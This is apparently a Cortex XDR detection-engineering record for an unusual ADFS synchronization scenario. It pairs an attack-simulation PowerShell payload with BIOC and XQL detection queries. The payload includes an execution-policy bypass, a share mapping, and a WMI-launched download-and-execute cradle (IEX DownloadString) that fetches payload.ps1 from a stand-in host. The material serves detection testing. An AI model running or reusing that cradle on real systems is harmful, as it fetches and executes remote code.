identity.name: Unusual ADFS Remote Synchronization from Non-ADFS Server
identity.summary: An attacker uses a non-ADFS server to initiate ADFS remote synchronization, which is typically only performed by ADFS servers. Cortex should detect this unusual network behavior and process execution.
identity.description: An attacker uses a non-ADFS server to initiate ADFS remote synchronization, which is typically only performed by ADFS servers. Cortex should detect this unusual network behavior and process execution.

payload.code:
powershell -exec bypass -Command "[System.Net.Dns]::GetHostEntry('192.0.2.10')"
net use Z: \\192.0.2.10\share
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.50:8080/payload.ps1')\""

expected_artifacts.description: Outbound connection to ADFS server IP
PowerShell process initiated from non-ADFS host

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Unusual ADFS Sync Process
biocs.description: Detection of PowerShell process starting from non-ADFS server attempting ADFS sync
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'powershell.exe'
| filter causality_actor_process_image_name != 'lsass.exe'
| filter action_file_path contains 'adfs'

abiocs.name: ADFS Remote Sync from Non-ADFS Host
abiocs.description: Behavioral deviation when a non-ADFS server initiates ADFS synchronization
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.10'
| filter causality_actor_process_image_name != 'lsass.exe'
| filter action_file_path contains 'adfs'

xql_queries.name: Unusual ADFS Sync Network Activity
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter action_remote_ip = '192.0.2.10'
| filter causality_actor_process_image_name != 'lsass.exe'
| filter action_file_path contains 'adfs'
| comp count by agent_hostname, action_remote_ip
